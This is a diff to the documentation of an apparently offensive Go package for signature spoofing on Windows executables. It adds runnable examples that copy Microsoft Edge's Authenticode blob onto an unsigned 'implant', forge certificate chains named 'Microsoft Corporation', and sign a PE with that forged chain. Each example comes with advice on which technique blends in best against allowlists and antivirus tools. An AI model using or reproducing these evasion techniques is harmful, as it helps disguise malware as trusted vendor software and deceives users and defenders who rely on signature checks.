@@ -10,22 +10,78 @@ reflects_commit: c1f35d0
 
 ## TL;DR
 
-Lift the Authenticode certificate blob from a legitimately signed
-PE (Microsoft binary, vendor driver, etc.) and append it to an
-unsigned implant — patching the security directory in place. The
-signature won't verify cryptographically but many naive scanners
-only check for certificate *presence*, not *validity*.
+Take the digital signature blob out of a real, signed program
+(say, `notepad.exe`) and paste it into an unsigned implant. The
+implant now LOOKS signed in any tool that asks "is there a
+signature?" — Properties dialog, naive AV scripts, basic
+allowlist checks — even though `signtool verify` would still
+reject it (the signature was made for `notepad.exe`'s bytes,
+not yours).
 
-## Primer
+Three layers ship in this package, each adding more realism:
 
-Windows uses Authenticode signatures to verify executable
-provenance. The cryptographic check is two-part: presence of a
-certificate blob in the PE security directory, and validation of
-that blob against a trusted root CA. A surprising number of
-defensive tools — naive AV, file-property dialogs, allowlists
-keyed on "is signed?" — only check the first part. Cloning a
-known-good cert blob onto an unsigned implant clears those naive
-checks while still failing `signtool verify`.
+| Tool | What you get | What still fails |
+|---|---|---|
+| [`Copy`](#copysrcpe-dstpe-string-error) | Real Microsoft (or any donor) signature blob in your PE. Properties dialog reads "Microsoft Corporation". | `signtool verify` says "hash mismatch" — the donor's hash doesn't match your bytes. |
+| [`Forge`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#Forge) | A self-built cert chain (Leaf → optional Intermediate → Root) wrapped in PKCS#7. You control every field. | Same hash mismatch + chain root is unknown to Windows. |
+| [`SignPE`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#SignPE) | Real Authenticode signature over your PE's actual hash, with a forged chain. signtool extracts the chain cleanly. | Trust-store walk: Windows doesn't recognize your self-signed root. The only way past this is a leaf cert from a CA Windows trusts (stolen / purchased). |
+
+## Primer — vocabulary
+
+If you're new to Windows code-signing, three terms recur
+throughout this page:
+
+> **WIN_CERTIFICATE** — the binary blob (header + PKCS#7 payload)
+> appended at the end of a signed PE. 8-byte header
+> (length / revision / type) + the cryptographic content.
+>
+> **Security directory** — entry index 4 in the PE optional-header
+> "data directories". Its `VirtualAddress` field points at where
+> the WIN_CERTIFICATE lives in the file (unusually, this is a
+> file offset, NOT a virtual address — the only data directory
+> that works this way).
+>
+> **Authenticode hash** — a special SHA-256 of the PE that
+> *excludes* the parts that change when you sign it (the
+> CheckSum field, the security directory entry, and the
+> certificate table itself). This is what the signature
+> actually attests to — it's why moving a signature between
+> two PEs always fails verification: the hash differs.
+>
+> **PKCS#7 SignedData** — the cryptographic envelope inside the
+> WIN_CERTIFICATE: list of certificates + signer info + signature.
+> Authenticode adds Microsoft-specific fields on top
+> (`SpcIndirectDataContent` carrying the Authenticode hash).
+
+## How a signature check works
+
+```mermaid
+sequenceDiagram
+    participant App as "Tool checking the file<br>(SmartScreen, AV, signtool, your script)"
+    participant WT as "WinTrust"
+    participant PE as "implant.exe"
+    participant CA as "Trust store<br>(Windows root CAs)"
+    App->>WT: "is this file signed?"
+    WT->>PE: read security directory
+    alt Empty (no WIN_CERTIFICATE)
+        WT-->>App: NOT_SIGNED
+        Note over App: A naive script may stop here.
+    else Has WIN_CERTIFICATE (cert.Copy / Forge / SignPE)
+        WT->>PE: hash the file (Authenticode hash)
+        WT->>WT: parse PKCS#7, extract signer + chain
+        WT->>WT: verify signature matches (hash, key) pair
+        WT->>CA: walk chain to a trusted root
+        Note over WT: Each step can fail independently:<br>presence ✓, hash ✗, chain unknown ✗, etc.
+        WT-->>App: TRUSTED / UNTRUSTED + reason code
+    end
+```
+
+Naive checks (Properties dialog "Publisher" line, scripts that
+only look at `(Get-AuthenticodeSignature).Status -ne $null`)
+stop at the first branch — presence is enough for them.
+Defenders that matter (`signtool verify /pa`, SmartScreen,
+AppLocker with publisher rules, EDR file-write telemetry)
+walk the full chain.
 
 The package is **cross-platform**: cert blobs are pure-byte PE
 manipulation, no Win32 APIs involved. Use it on a Linux build
@@ -443,7 +499,74 @@ operator reuse the leaf key + chain across multiple PEs.
 
 ## Examples
 
-### Simple — copy a Microsoft cert onto an implant
+### Quick start — your first cert graft (read this one)
+
+You have an unsigned `implant.exe` and you want it to look signed.
+The shortest path is to copy a real Authenticode signature from
+some trusted Windows binary onto your file. Here Microsoft Edge
+is a good donor (it carries a real Microsoft signature in its PE).
+
+```go
+package main
+
+import (
+    "fmt"
+    "log"
+
+    "github.com/oioio-space/maldev/pe/cert"
+)
+
+func main() {
+    donor   := `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`
+    implant := `C:\loader.exe`
+
+    // Step 1: confirm the implant has NO signature today.
+    has, err := cert.Has(implant)
+    if err != nil { log.Fatal(err) }
+    fmt.Println("before — has signature?", has)  // → false
+
+    // Step 2: copy the Edge signature onto the implant.
+    //         Internally: read Edge's WIN_CERTIFICATE blob,
+    //         append it to implant.exe, patch the security
+    //         directory, recompute the optional-header CheckSum.
+    if err := cert.Copy(donor, implant); err != nil {
+        log.Fatal(err)
+    }
+
+    // Step 3: confirm the implant LOOKS signed.
+    has, _ = cert.Has(implant)
+    fmt.Println("after  — has signature?", has)  // → true
+
+    // Step 4: parse the grafted signature to see who "signed" us.
+    parsed, err := cert.Inspect(implant)
+    if err != nil { log.Fatal(err) }
+    fmt.Println("apparent signer:", parsed.Subject)
+    // → CN=Microsoft Corporation, O=Microsoft Corporation, ...
+}
+```
+
+What this does NOT achieve:
+
+- `signtool verify /pa C:\loader.exe` → `0x80096010` "hash
+  mismatch". The signature is for Edge's bytes, not yours.
+- SmartScreen / AppLocker with publisher rules will reject it.
+
+What this DOES achieve:
+
+- File Explorer → Properties → Digital Signatures shows
+  "Microsoft Corporation".
+- PowerShell `(Get-AuthenticodeSignature C:\loader.exe).SignerCertificate`
+  returns Microsoft's leaf cert (because the cert IS Microsoft's
+  — only the file it's attached to has changed).
+- Naive "is this file signed?" allowlists pass.
+
+This is the **Copy** path: minimum effort, maximum cosmetic.
+The two paths below add increasing realism (`Forge` lets you
+control the apparent signer; `SignPE` actually signs your hash).
+
+### Simple — copy a Microsoft cert onto an implant (one-liner)
+
+For when you don't need the explanation:
 
 ```go
 import "github.com/oioio-space/maldev/pe/cert"
@@ -456,73 +579,176 @@ if err := cert.Copy(
 }
 ```
 
-### Composed — pure-Go forge + write
+⚠ `notepad.exe` on modern Windows is **catalog-signed** (no
+embedded signature) — `cert.Copy` will return `ErrNoCertificate`.
+Use a third-party signed donor instead (Edge, OneDrive, Acrobat,
+Firefox, VS Code, …). See [Catalog signing](catalog-signing.md)
+for why System32 binaries don't carry embedded blobs.
+
+### Forge — invent your own cert chain, no donor needed
+
+`Copy` requires a donor PE you can read. `Forge` skips that step
+by **generating** a cert chain in pure Go: you pick the publisher
+name, organization, validity dates — anything you'd see in the
+Properties dialog. The output is wrapped in a SignedData blob and
+ready to paste into a PE just like a real donor's blob.
+
+**Why use this instead of Copy?**
+
+- You control every visible field — useful for impersonating a
+  vendor whose binary you don't have on your build host.
+- No dependency on a donor file existing at runtime.
+- The chain is uniquely yours — no two implants share a
+  fingerprint (each `Forge` call generates fresh keys + serials).
+
+**What you still don't get** (same as Copy): the chain is
+self-signed → no Windows root trusts it → `signtool verify` rejects.
+For a chain that signtool *parses* cleanly (trust-store walk
+still fails), use [`SignPE`](#signpe--actually-sign-your-pe-real-authenticode)
+instead.
 
 ```go
+package main
+
 import (
     "crypto/x509/pkix"
+    "fmt"
+    "log"
 
     "github.com/oioio-space/maldev/pe/cert"
 )
 
-// One-shot forge: 3-tier chain (leaf → intermediate → self-signed
-// root) with Microsoft-style subject names so the file-properties
-// dialog reads as legitimate.
-chain, err := cert.Forge(cert.ForgeOptions{
-    LeafSubject: pkix.Name{
-        CommonName:   "Microsoft Corporation",
-        Organization: []string{"Microsoft Corporation"},
-        Country:      []string{"US"},
-    },
-    IntermediateSubject: pkix.Name{
-        CommonName: "Microsoft Code Signing PCA 2024",
-    },
-    RootSubject: pkix.Name{
-        CommonName: "Microsoft Root Certificate Authority 2024",
-    },
-})
-if err != nil { panic(err) }
+func main() {
+    // Build the chain in memory. Three tiers (leaf → intermediate
+    // → self-signed root) look more legitimate than two; matches
+    // real-world publisher → CA → root patterns.
+    chain, err := cert.Forge(cert.ForgeOptions{
+        LeafSubject: pkix.Name{
+            CommonName:   "Microsoft Corporation",
+            Organization: []string{"Microsoft Corporation"},
+            Country:      []string{"US"},
+        },
+        IntermediateSubject: pkix.Name{
+            CommonName: "Microsoft Code Signing PCA 2024",
+        },
+        RootSubject: pkix.Name{
+            CommonName: "Microsoft Root Certificate Authority 2024",
+        },
+        // ValidFrom / ValidTo default to [now-1y, now+5y] — naive
+        // "is the cert still in date" checks pass for 5 years.
+    })
+    if err != nil { log.Fatal(err) }
 
-if err := cert.Write(`C:\loader.exe`, chain.Certificate); err != nil {
-    panic(err)
+    fmt.Println("forged leaf subject:", chain.Leaf.Subject)
+    fmt.Println("leaf serial:        ", chain.Leaf.SerialNumber)
+    fmt.Println("blob size:          ", len(chain.Certificate.Raw), "bytes")
+
+    // Splice into the implant. cert.Write recomputes the
+    // optional-header CheckSum so the file remains internally
+    // consistent.
+    if err := cert.Write(`C:\loader.exe`, chain.Certificate); err != nil {
+        log.Fatal(err)
+    }
+    // → loader.exe Properties → Publisher: Microsoft Corporation
 }
-// loader.exe now reports "Publisher: Microsoft Corporation" in
-// the Properties dialog. signtool verify rejects it; SmartScreen
-// flags it. See API Reference > Forge > "What it does NOT give".
 ```
 
-### Composed — full Authenticode signing (Phase 2)
+**Reusing the chain**: `chain.Leaf`, `chain.LeafKey`, `chain.Root`,
+`chain.RootKey` are all returned so you can graft the same
+identity onto multiple PEs without paying the keygen cost twice
+(RSA-2048 generation takes ~30-100ms).
+
+### SignPE — actually sign your PE (real Authenticode)
+
+`Forge` builds a chain but doesn't actually sign **your** file —
+the SignedData wraps an arbitrary `Content` byte string (or empty
+by default), not your PE's hash. `signtool verify` notices this
+and refuses to even parse the signature ("No signature found").
+
+`SignPE` closes that gap. It computes your PE's Authenticode
+hash, wraps it in the Microsoft-canonical `SpcIndirectDataContent`,
+hand-rolls a SignedData with all the right ASN.1 fields
+(`eContentType` set to the Authenticode OID, signed attributes
+including `messageDigest` over your hash, RSA-SHA256 signature
+from a forged leaf key), and splices the result into the PE.
+
+**End result**: `signtool verify /pa /v loader.exe` parses the
+chain, prints the publisher / validity / fingerprints, and only
+fails on the very last step — the trust-store walk — because the
+root is self-signed:
+
+```text
+Verifying: C:\loader.exe
+Signature Index: 0 (Primary Signature)
+Hash of file (sha256): 0E9A...C6DB
+
+Signing Certificate Chain:
+    Issued to: Microsoft Root Certificate Authority
+    Issued by: Microsoft Root Certificate Authority
+    Expires:   Mon May 05 10:01:40 2031
+    SHA1 hash: C354...9C29
+
+        Issued to: Microsoft Corporation
+        Issued by: Microsoft Root Certificate Authority
+        Expires:   Mon May 05 10:01:40 2031
+        SHA1 hash: 464E...5DF5
+
+SignTool Error: A certificate chain processed, but terminated in
+                a root certificate which is not trusted by the
+                trust provider.
+```
+
+That last error (`0x800B0109`) is the only difference between
+this output and a fully-trusted Microsoft signature. To close it
+in pure Go is **impossible** — you'd need a leaf cert issued by
+a CA Windows already trusts (stolen from a real signer, or
+purchased EV).
 
 ```go
+package main
+
 import (
     "crypto/x509/pkix"
+    "fmt"
+    "log"
 
     "github.com/oioio-space/maldev/pe/cert"
 )
 
-// Hand-rolled SignedData with eContentType = OIDSpcIndirectDataContent,
-// canonical SpcPEImageData with SpcLink "<<<Obsolete>>>", signed
-// attributes (contentType + messageDigest), leaf-key RSA-SHA256
-// signature over the canonical SET-tagged signed attrs DER.
-chain, err := cert.SignPE(`C:\loader.exe`, cert.SignOptions{
-    LeafSubject: pkix.Name{
-        CommonName:   "Microsoft Corporation",
-        Organization: []string{"Microsoft Corporation"},
-        Country:      []string{"US"},
-    },
-    RootSubject: pkix.Name{
-        CommonName: "Microsoft Root Certificate Authority",
-    },
-})
-if err != nil { panic(err) }
-_ = chain // chain.Leaf, chain.LeafKey, chain.Root reusable across PEs
+func main() {
+    chain, err := cert.SignPE(`C:\loader.exe`, cert.SignOptions{
+        LeafSubject: pkix.Name{
+            CommonName:   "Microsoft Corporation",
+            Organization: []string{"Microsoft Corporation"},
+            Country:      []string{"US"},
+        },
+        RootSubject: pkix.Name{
+            CommonName: "Microsoft Root Certificate Authority",
+        },
+        // No IntermediateSubject → 2-tier chain (leaf + root).
+        // Add IntermediateSubject for the more legitimate-looking
+        // 3-tier shape Microsoft actually uses.
+    })
+    if err != nil { log.Fatal(err) }
 
-// signtool verify /pa /v loader.exe now extracts the chain
-// successfully — only the trust-store walk fails because the
-// root is self-signed (intended limitation: you can't pure-Go
-// produce a chain Windows trusts without a stolen / purchased
-// real CA-issued leaf).
+    fmt.Println("signed leaf:    ", chain.Leaf.Subject)
+    fmt.Println("leaf SHA1:      ", chain.Leaf.Raw[:4], "…") // truncated
+    fmt.Println("file CheckSum recomputed automatically by SignPE.")
+}
 ```
+
+**When to choose Copy vs Forge vs SignPE**:
+
+- **Copy**: you have a donor PE, you want maximum cosmetic with
+  zero crypto. Detection class: any tool that hashes the file
+  rejects you immediately.
+- **Forge**: no donor available, you want any "publisher" name.
+  Same detection class as Copy plus the chain root is unknown.
+- **SignPE**: same effort as Forge but `signtool verify` extracts
+  the chain instead of refusing to parse — the implant looks like
+  it was intentionally signed (just by an unknown CA). Better
+  blend-in for tools that LOG signature details but don't enforce
+  trust strictly.
 
 ### Composed — external signer pipeline (BYO key)
 
